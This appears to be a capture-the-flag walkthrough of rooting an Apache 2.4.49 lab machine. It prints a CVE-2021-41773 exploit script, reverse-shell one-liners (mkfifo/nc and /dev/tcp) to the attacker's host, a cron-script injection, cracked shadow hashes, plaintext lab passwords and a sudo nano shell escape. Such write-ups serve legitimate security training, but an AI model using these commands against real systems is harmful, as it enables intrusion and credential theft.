@@ -1,1 +1,705 @@
 
+                         ENUMERATION
+			
+
+---nmap---
+
+                     
+┌──(root㉿kali)-[/home/okina]
+└─# nmap 10.0.2.52 -sS -sC -sV -A -T4 -p-                       
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-09 12:32 +03
+Nmap scan report for 10.0.2.52
+Host is up (0.00079s latency).
+Not shown: 65533 closed tcp ports (reset)
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   3072 bc:95:83:6e:c4:62:38:b5:a9:94:0c:14:a3:bf:57:34 (RSA)
+|   256 07:fa:46:1a:ca:f3:dc:08:2f:72:8c:e2:f2:2e:32:e5 (ECDSA)
+|_  256 46:ff:72:d5:67:c5:1f:87:b1:35:84:29:f3:ad:e8:3a (ED25519)
+80/tcp open  http    Apache httpd 2.4.49 ((Unix))
+|_http-title: Apaches
+| http-methods: 
+|_  Potentially risky methods: TRACE
+|_http-server-header: Apache/2.4.49 (Unix)
+| http-robots.txt: 1 disallowed entry 
+|_/
+MAC Address: 08:00:27:B2:79:A9 (Oracle VirtualBox virtual NIC)
+Device type: general purpose
+Running: Linux 4.X|5.X
+OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
+OS details: Linux 4.15 - 5.8
+Network Distance: 1 hop
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+TRACEROUTE
+HOP RTT     ADDRESS
+1   0.79 ms 10.0.2.52
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 31.38 seconds
+                 
+
+
+---we check the website and in the our team section there are four usernames, I save them into a text file,
+usernames come in handy---
+
+
+                                                                                
+┌──(root㉿kali)-[/home/okina/Desktop/NOTLAR/APACHE LINUX CTF]
+└─# cat users.txt     
+geronimo
+pocahontas
+sacagawea
+squanto
+   
+
+
+
+
+---let's run a gobuster scan---
+
+
+┌──(root㉿kali)-[/home/okina]
+└─# gobuster dir -u http://10.0.2.52 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -x html,txt        
+===============================================================
+Gobuster v3.6
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://10.0.2.52
+[+] Method:                  GET
+[+] Threads:                 10
+[+] Wordlist:                /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.6
+[+] Extensions:              txt,html
+[+] Timeout:                 10s
+===============================================================
+Starting gobuster in directory enumeration mode
+===============================================================
+/.html                (Status: 403) [Size: 199]
+/images               (Status: 301) [Size: 232] [--> http://10.0.2.52/images/]
+/index.html           (Status: 200) [Size: 33940]
+/css                  (Status: 301) [Size: 229] [--> http://10.0.2.52/css/]
+/js                   (Status: 301) [Size: 228] [--> http://10.0.2.52/js/]
+/robots.txt           (Status: 200) [Size: 116]
+/fonts                (Status: 301) [Size: 231] [--> http://10.0.2.52/fonts/]
+/.html                (Status: 403) [Size: 199]
+Progress: 661680 / 661683 (100.00%)
+===============================================================
+Finished
+===============================================================
+           
+
+
+
+---we find robots.txt, when we check it we discover a hash---
+
+IOKAnFlvdSBrbm93IHlvdXIgcGF0aCwgY2hpbGQsIG5vdyBmb2xsb3cgaXQu4oCdCi0tIFBvY2Fob250YXMg
+
+
+
+---It looks like base64, let's decode it--- 
+
+
+┌──(root㉿kali)-[/home/okina/Desktop/NOTLAR/APACHE LINUX CTF]
+└─# echo 'IOKAnFlvdSBrbm93IHlvdXIgcGF0aCwgY2hpbGQsIG5vdyBmb2xsb3cgaXQu4oCdCi0tIFBvY2Fob250YXMg' > hash.txt | base64 -d
+ “You know your path, child, now follow it.”
+-- Pocahontas                                                                                   
+
+
+
+---Well, this clue doesn't lead to anywhere---
+			
+
+
+---Let's check for something else, in our nmap scan we saw that http was open and the version was 
+Apache 2.4.49, let's search for this version with searchsploit---
+
+
+Searchsploit: Exploit Database Archive Search
+
+
+                                                                                    
+┌──(root㉿kali)-[/home/okina]
+└─# searchsploit apache 2.4.49
+-------------------------------------------------- ---------------------------------
+ Exploit Title                                    |  Path
+-------------------------------------------------- ---------------------------------
+Apache + PHP < 5.3.12 / < 5.4.2 - cgi-bin Remote  | php/remote/29290.c
+Apache + PHP < 5.3.12 / < 5.4.2 - Remote Code Exe | php/remote/29316.py
+Apache CXF < 2.5.10/2.6.7/2.7.4 - Denial of Servi | multiple/dos/26710.txt
+Apache HTTP Server 2.4.49 - Path Traversal & Remo | multiple/webapps/50383.sh
+Apache mod_ssl < 2.8.7 OpenSSL - 'OpenFuck.c' Rem | unix/remote/21671.c
+Apache mod_ssl < 2.8.7 OpenSSL - 'OpenFuckV2.c' R | unix/remote/47080.c
+Apache mod_ssl < 2.8.7 OpenSSL - 'OpenFuckV2.c' R | unix/remote/764.c
+Apache OpenMeetings 1.9.x < 3.1.0 - '.ZIP' File D | linux/webapps/39642.txt
+Apache Tomcat < 5.5.17 - Remote Directory Listing | multiple/remote/2061.txt
+Apache Tomcat < 6.0.18 - 'utf8' Directory Travers | multiple/remote/6229.txt
+Apache Tomcat < 6.0.18 - 'utf8' Directory Travers | unix/remote/14489.c
+Apache Tomcat < 9.0.1 (Beta) / < 8.5.23 / < 8.0.4 | jsp/webapps/42966.py
+Apache Tomcat < 9.0.1 (Beta) / < 8.5.23 / < 8.0.4 | windows/webapps/42953.txt
+Apache Xerces-C XML Parser < 3.1.2 - Denial of Se | linux/dos/36906.txt
+Webfroot Shoutbox < 2.32 (Apache) - Local File In | linux/remote/34.pl
+-------------------------------------------------- ---------------------------------
+Shellcodes: No Results
+
+
+
+---we see an exploit that satisfy our requirements---
+
+Apache HTTP Server 2.4.49 - Path Traversal & Remo | multiple/webapps/50383.sh
+
+
+
+
+---To download this script we need to write the number of the said exploit---
+
+
+┌──(root㉿kali)-[/home/okina/Desktop/NOTLAR/APACHE LINUX CTF]
+└─# searchsploit -m 50383     
+  Exploit: Apache HTTP Server 2.4.49 - Path Traversal & Remote Code Execution (RCE)
+      URL: https://www.exploit-db.com/exploits/50383
+     Path: /usr/share/exploitdb/exploits/multiple/webapps/50383.sh
+    Codes: CVE-2021-41773
+ Verified: True
+File Type: ASCII text
+Copied to: /home/okina/50383.sh
+
+
+
+                                                     
+
+---we should check the content of the exploit before we execute it---
+                      
+         
+┌──(root㉿kali)-[/home/okina/Desktop/NOTLAR/APACHE LINUX CTF]
+└─# cat 50383.sh      
+# Exploit Title: Apache HTTP Server 2.4.49 - Path Traversal & Remote Code Execution (RCE)
+# Date: 10/05/2021
+# Exploit Author: Lucas Souza https://lsass.io
+# Vendor Homepage:  https://apache.org/
+# Version: 2.4.49
+# Tested on: 2.4.49
+# CVE : CVE-2021-41773
+# Credits: Ash Daulton and the cPanel Security Team
+
+#!/bin/bash
+
+if [[ $1 == '' ]]; [[ $2 == '' ]]; then
+echo Set [TAGET-LIST.TXT] [PATH] [COMMAND]
+echo ./PoC.sh targets.txt /etc/passwd
+exit
+fi
+for host in $(cat $1); do
+echo $host
+curl -s --path-as-is -d "echo Content-Type: text/plain; echo; $3" "$host/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e$2"; done
+
+# PoC.sh targets.txt /etc/passwd
+# PoC.sh targets.txt /bin/sh whoami                                                          
+
+
+
+---here we see that the exploit reads from a file named targets.txt that contains an IP adress. So let's create
+a file with the target's IP adress in it---
+
+---we also see that we can run command /bin/sh/whoami---
+
+
+                                                                                    
+┌──(root㉿kali)-[/home/okina/Desktop/NOTLAR/APACHE LINUX CTF]
+└─# echo '10.0.2.52' > targets.txt
+                                                                                    
+┌──(root㉿kali)-[/home/okina/Desktop/NOTLAR/APACHE LINUX CTF]
+└─# cat targets.txt 
+10.0.2.52
+             
+
+
+
+---now execute the bash---
+
+                                                                                    
+┌──(root㉿kali)-[/home/okina/Desktop/NOTLAR/APACHE LINUX CTF]
+└─# ./50383.sh targets.txt /bin/sh whoami
+./50383.sh: 12: [[: not found
+./50383.sh: 12: [[: not found
+10.0.2.52
+daemon
+
+
+
+---looks like we are daemon. Let's run a reverse shell with our bash, set up our listener first---
+
+
+┌──(root㉿kali)-[/home/okina]
+└─# nc -lnvp 5050
+listening on [any] 5050 ...
+
+
+
+---To create a reverse shell I check the revshells, from there I will search for a /bin/sh shell---
+
+---I look for a mkfifo reverse shell because we have a bash file to execute---
+
+
+Mkfifo: This command creates FIFO special files by the file parameter in the orders specified
+
+
+
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.2.15 5050 >/tmp/f
+
+
+---This is our reverse shell, lets execute it now---
+
+                                                                                
+┌──(root㉿kali)-[/home/okina/Desktop/NOTLAR/APACHE LINUX CTF]
+└─# ./50383.sh targets.txt /bin/sh 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.2.15 5050 >/tmp/f'
+
+
+
+
+┌──(root㉿kali)-[/home/okina]
+└─# nc -lnvp 5050
+listening on [any] 5050 ...
+connect to [10.0.2.15] from (UNKNOWN) [10.0.2.52] 46364
+/bin/sh: 0: can't access tty; job control turned off
+$ whoami
+daemon
+$ python3 -c 'import pty;pty.spawn("/bin/bash")';
+daemon@apaches:/usr/bin$ 
+
+
+
+---we are in as daemon, I check around the files but can't find much. We don't have permission to read other
+user's files---
+
+
+
+---Let's use linpeas and check for possible privilege escalate vectors---
+
+			
+daemon@apaches:/tmp$ wget http://10.0.2.15:8000/linpeas.sh
+wget http://10.0.2.15:8000/linpeas.sh
+--2024-05-10 10:55:04--  http://10.0.2.15:8000/linpeas.sh
+Connecting to 10.0.2.15:8000... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 860549 (840K) [text/x-sh]
+Saving to: ‘linpeas.sh’
+
+linpeas.sh          100%[===================>] 840.38K  --.-KB/s    in 0.04s   
+
+2024-05-10 10:55:04 (21.0 MB/s) - ‘linpeas.sh’ saved [860549/860549]
+
+daemon@apaches:/tmp$ bash linpeas.sh
+bash linpeas.sh
+
+
+
+
+---in the results we see user hashes, that is great---
+
+daemon:*:18375:0:99999:7:::
+bin:*:18375:0:99999:7:::
+sys:*:18375:0:99999:7:::
+sync:*:18375:0:99999:7:::
+games:*:18375:0:99999:7:::
+man:*:18375:0:99999:7:::
+lp:*:18375:0:99999:7:::
+mail:*:18375:0:99999:7:::
+news:*:18375:0:99999:7:::
+uucp:*:18375:0:99999:7:::
+proxy:*:18375:0:99999:7:::
+www-data:*:18375:0:99999:7:::
+backup:*:18375:0:99999:7:::
+list:*:18375:0:99999:7:::
+irc:*:18375:0:99999:7:::
+gnats:*:18375:0:99999:7:::
+nobody:*:18375:0:99999:7:::
+systemd-network:*:18375:0:99999:7:::
+systemd-resolve:*:18375:0:99999:7:::
+systemd-timesync:*:18375:0:99999:7:::
+messagebus:*:18375:0:99999:7:::
+syslog:*:18375:0:99999:7:::
+_apt:*:18375:0:99999:7:::
+tss:*:18375:0:99999:7:::
+uuidd:*:18375:0:99999:7:::
+tcpdump:*:18375:0:99999:7:::
+landscape:*:18375:0:99999:7:::
+pollinate:*:18375:0:99999:7:::
+sshd:*:19265:0:99999:7:::
+systemd-coredump:!!:19265::::::
+geronimo:$6$Ms03aNp5hRoOuZpM$CoHMkl9rgA0jZR2D9FfGJms9dR8OZw5j0gimH0V14DJ/F2Xp2.Mun4ESEdoNMoPC5ioRuOCXgakCB2snc6yiw0:19275:0:99999:7:::
+lxd:!:19265::::::
+squanto:$6$KzBC2ThBhmbVBy0J$eZSVdFLsAfd8IsbcAaBzHp8DzKXETPUH9FKsnlivIFSCvs0UBz1zsh9OfPmKcX5VaP7.Cy3r1r5msibslk0Sd.:19274:0:99999:7:::
+sacagawea:$6$7jhI/21/BZR5KyY6$ry9zrhuggELLYnGkMtUi0UHBdDDaOiIgSB9y9od/73Qxk/nQOSzJNo3VKzZYS8pnluVYkXhVvghOzNCPBx79T1:19274:0:99999:7:::
+pocahontas:$6$ecLWB6Q6bVJrGFu8$KgkvUSbQzXB6v3aJuE9NMwVvs2a53APkgzSxPq.DWfgIYKbzN0svWT4VDYm/l2ku7lMGJ8dxKi1fGphRx1tO8/:19274:0:99999:7:::
+
+
+
+---I copy these into a file named userhashes.txt, let's try to crack any of these files via john---
+
+                                                                                                                  
+
+┌──(root㉿kali)-[/home/okina/Desktop/NOTLAR/APACHE LINUX CTF]
+└─# john --wordlist=/home/okina/wordlists/rockyou.txt userhashes.txt 
+Using default input encoding: UTF-8
+Loaded 4 password hashes with 4 different salts (sha512crypt, crypt(3) $6$ [SHA512 128/128 SSE2 2x])
+Cost 1 (iteration count) is 5000 for all loaded hashes
+Will run 2 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+iamtheone        (squanto)     
+
+
+
+---we got the user squanto's password, iamtheone---
+
+
+---Let's get into ssh---
+
+
+
+
+			GAINING FOOTHOLD
+			
+
+┌──(root㉿kali)-[/home/okina]
+└─# ssh squanto@10.0.2.52
+                                                                                
+                                                                                
+                                                                                
+If at first you don't succeed. Try, try again! Sometimes the second time returns more!
+                                   
+                   
+squanto@10.0.2.52's password: 
+Welcome to Ubuntu 20.04 LTS (GNU/Linux 5.4.0-128-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+  System information as of Fri 10 May 2024 11:29:00 AM UTC
+
+  System load:  0.03               Processes:               127
+  Usage of /:   20.9% of 39.07GB   Users logged in:         0
+  Memory usage: 16%                IPv4 address for enp0s3: 10.0.2.52
+  Swap usage:   0%
+
+ * Strictly confined Kubernetes makes edge and IoT secure. Learn how MicroK8s
+   just raised the bar for easy, resilient and secure K8s cluster deployment.
+
+   https://ubuntu.com/engage/secure-kubernetes-at-the-edge
+
+143 updates can be installed immediately.
+2 of these updates are security updates.
+To see these additional updates run: apt list --upgradable
+
+
+Last login: Thu May  9 10:23:36 2024 from 10.0.2.15
+squanto@apaches:~$ ls
+backup  todo.md  user.txt
+squanto@apaches:~$ cat user.txt 
+
+  ______ _                      __                               _        
+ |  ____| |                    / _|                             | |       
+ | |__  | | __ _  __ _    ___ | |_   ___  __ _ _   _  __ _ _ __ | |_ ___  
+ |  __| | |/ _` |/ _` |  / _ \|  _| / __|/ _` | | | |/ _` | '_ \| __/ _ \ 
+ | |    | | (_| | (_| | | (_) | |   \__ \ (_| | |_| | (_| | | | | || (_) |
+ |_|    |_|\__,_|\__, |  \___/|_|   |___/\__, |\__,_|\__,_|_| |_|\__\___/ 
+                  __/ |                     | |                           
+                 |___/                      |_|                     
+
+
+
+---okay, not much come from the first user squanto, let's keep on looking though---
+
+
+
+squanto@apaches:~$ cat /etc/crontab
+# /etc/crontab: system-wide crontab
+# Unlike any other crontab you don't have to run the `crontab'
+# command to install the new version when you edit this file
+# and files in /etc/cron.d. These files also have username fields,
+# that none of the other crontabs do.
+
+SHELL=/bin/sh
+PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
+
+# Example of job definition:
+# .---------------- minute (0 - 59)
+# |  .------------- hour (0 - 23)
+# |  |  .---------- day of month (1 - 31)
+# |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...
+# |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat
+# |  |  |  |  |
+# *  *  *  *  * user-name command to be executed
+17 *	* * *	root    cd / && run-parts --report /etc/cron.hourly
+25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
+47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
+52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
+#
+
+#* 5 * * * * su sacagawea -c "./home/sacagawea/Scripts/backup.sh"
+
+
+
+---seeing at cronjobs we see sacagawea runs a bash script that probably does something with a backup---
+
+
+
+
+squanto@apaches:/home/sacagawea/Scripts$ cat backup.sh 
+#!/bin/bash
+
+rm -rf /home/sacagawea/Backup/Backup.tar.gz
+tar -czvf /home/sacagawea/Backup/Backup.tar.gz /usr/local/apache2.4.49/htdocs
+chmod 700 /home/sacagawea/Backup/Backup.tar.gz
+/bin/bash -i >& /dev/tcp/10.0.2.15/4040 0>&1
+
+
+---okay, we see what the script does, and we can edit the file. So let's create a listener and then 
+put a reverse connection into here---
+
+                                                                                
+┌──(root㉿kali)-[/home/okina]
+└─# nc -lnvp 1234
+listening on [any] 1234 ...
+
+
+squanto@apaches:/home/sacagawea/Scripts$ echo '/bin/bash -i >& /dev/tcp/10.0.2.15/1234 0>&1' >> backup.sh 
+
+
+squanto@apaches:/home/sacagawea/Scripts$ cat backup.sh 
+#!/bin/bash
+
+rm -rf /home/sacagawea/Backup/Backup.tar.gz
+tar -czvf /home/sacagawea/Backup/Backup.tar.gz /usr/local/apache2.4.49/htdocs
+chmod 700 /home/sacagawea/Backup/Backup.tar.gz
+/bin/bash -i >& /dev/tcp/10.0.2.15/1234 0>&1
+
+
+
+---wait a litle bit and you get the sacagawea's shell---
+
+┌──(root㉿kali)-[/home/okina]
+└─# nc -lnvp 1234
+listening on [any] 1234 ...
+connect to [10.0.2.15] from (UNKNOWN) [10.0.2.52] 37376
+bash: cannot set terminal process group (62867): Inappropriate ioctl for device
+bash: no job control in this shell
+sacagawea@apaches:~$ cd ~
+cd ~
+sacagawea@apaches:~$ ls
+ls
+Backup
+Development
+Scripts
+user.txt
+sacagawea@apaches:~$ cat user.txt
+cat user.txt
+
+                                                                                                                 
+  _____ _                      __                                                      
+ |  ___| | __ _  __ _    ___  / _|  ___  __ _  ___ __ _  __ _  __ ___      _____  __ _ 
+ | |_  | |/ _` |/ _` |  / _ \| |_  / __|/ _` |/ __/ _` |/ _` |/ _` \ \ /\ / / _ \/ _` |
+ |  _| | | (_| | (_| | | (_) |  _| \__ \ (_| | (_| (_| | (_| | (_| |\ V  V /  __/ (_| |
+ |_|   |_|\__,_|\__, |  \___/|_|   |___/\__,_|\___\__,_|\__, |\__,_| \_/\_/ \___|\__,_|
+                |___/                                   |___/                          
+
+
+---First User Flag---
+
+
+
+
+---let's keep on looking as the sacagawea user. So far we looked at user hashes and cronjobs to find a 
+way to privilege escalate---
+
+
+---we look at sacagawea's home directory and find interesting information---
+
+
+sacagawea@apaches:~$ ls -la
+ls -la
+total 48
+drwxr-xr-x 6 sacagawea sacagawea 4096 Jul 13  2023 .
+drwxr-xr-x 6 root      root      4096 Oct  9  2022 ..
+drwxrwxr-x 2 sacagawea sacagawea 4096 May 10 11:50 Backup
+-rw------- 1 sacagawea sacagawea    0 Oct 10  2022 .bash_history
+-rw-r--r-- 1 sacagawea sacagawea  220 Oct  9  2022 .bash_logout
+-rw-r--r-- 1 sacagawea sacagawea 3771 Oct  9  2022 .bashrc
+drwxrwxr-x 7 sacagawea sacagawea 4096 Oct 10  2022 Development
+drwxrwxr-x 3 sacagawea sacagawea 4096 Oct 10  2022 .local
+-rw-r--r-- 1 sacagawea sacagawea  807 Oct  9  2022 .profile
+drwxrwxr-x 2 sacagawea sacagawea 4096 Oct 10  2022 Scripts
+-rw-rw-r-- 1 sacagawea sacagawea   66 Oct 10  2022 .selected_editor
+-rw-rw---- 1 sacagawea sacagawea 5899 Jul 13  2023 user.txt
+sacagawea@apaches:~$ cd De	
+cd Development/
+sacagawea@apaches:~/Development$ ls
+ls
+admin
+css
+fonts
+images
+index.html
+js
+robots.txt
+
+sacagawea@apaches:~/Development$ cd adm	
+cd admin/
+sacagawea@apaches:~/Development/admin$ ls
+ls
+1a-login.php
+1b-login.css
+2-check.php
+3-protect.php
+
+sacagawea@apaches:~/Development/admin$ cat 2-check.php
+cat 2-check.php
+.
+.
+.
+
+// (B) HANDLE LOGIN
+if (isset($_POST["user"]) && !isset($_SESSION["user"])) {
+  // (B1) USERS & PASSWORDS - SET YOUR OWN !
+  $users = [
+    "geronimo" => "12u7D9@4IA9uBO4pX9#6jZ3456",
+    "pocahontas" => "y2U1@8Ie&OHwd^Ww3uAl",
+    "squanto" => "4Rl3^K8WDG@sG24Hq@ih",
+    "sacagawea" => "cU21X8&uGswgYsL!raXC"
+.
+.
+.
+.
+
+
+---here we see the user's default passwords, maybe one of them didn't change it, let's try for the users we 
+haven't logged in as---
+
+
+
+
+---and turns out dear pocahontas didn't change the password---
+
+
+┌──(root㉿kali)-[/home/okina/Desktop/NOTLAR/APACHE LINUX CTF]
+└─# ssh pocahontas@10.0.2.52            
+
+
+pocahontas@10.0.2.52's password: y2U1@8Ie&OHwd^Ww3uAl
+
+Welcome to Ubuntu 20.04 LTS (GNU/Linux 5.4.0-128-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+pocahontas@apaches:~$ ls
+user.txt
+pocahontas@apaches:~$ cat user.txt
+
+  _____ _                      __                         _                 _            
+ |  ___| | __ _  __ _    ___  / _|  _ __   ___   ___ __ _| |__   ___  _ __ | |_ __ _ ___ 
+ | |_  | |/ _` |/ _` |  / _ \| |_  | '_ \ / _ \ / __/ _` | '_ \ / _ \| '_ \| __/ _` / __|
+ |  _| | | (_| | (_| | | (_) |  _| | |_) | (_) | (_| (_| | | | | (_) | | | | || (_| \__ \
+ |_|   |_|\__,_|\__, |  \___/|_|   | .__/ \___/ \___\__,_|_| |_|\___/|_| |_|\__\__,_|___/
+                |___/              |_|                                                   
+
+
+You are on fire, keep going!
+
+
+
+
+---okay, so probably the user geronimo is the root user and has the final flag, let's keep on trying--- 
+
+
+
+
+			
+			PRIVILEGE ESCALATION
+
+
+
+---Check for SUID permissions---
+
+
+pocahontas@apaches:~$ sudo -l
+[sudo] password for pocahontas: 
+Matching Defaults entries for pocahontas on apaches:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User pocahontas may run the following commands on apaches:
+    (geronimo) /bin/nano
+
+
+---turns out we have a permission to run to become the geronimo user, a quick visit to the gtfobins---
+
+
+
+sudo /bin/nano
+^R ^X 			//this part is in the nano, use Ctrl+R then Ctrl+X
+reset; sh 1>&0 2>&0	//hit enter, then wait a little bit and hit enter multiple times
+
+
+
+---let's modify and use it---
+
+
+
+pocahontas@apaches:~$ sudo -u geronimo /bin/nano
+
+^R ^X 			
+
+reset; sh 1>&0 2>&0
+
+
+$ whoami
+geronimo
+
+
+---we are user geronimo---
+
+
+$ sudo -l
+Matching Defaults entries for geronimo on apaches:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User geronimo may run the following commands on apaches:
+    (ALL : ALL) ALL
+    (ALL) NOPASSWD: ALL
+
+
+---perfect, we can become root easily---
+
+
+
+$ sudo su
+root@apaches:/home/pocahontas# 		
+
+root@apaches:/home/pocahontas# cd ~
+
+root@apaches:~# ls
+root.txt  snap
+
+
+root@apaches:~# cat root.txt
+
+
+Awesome, you have captured the root flag!!!!!
+---Root User Flag---
+
+
+
+
+
+
+
+
+
+
+    
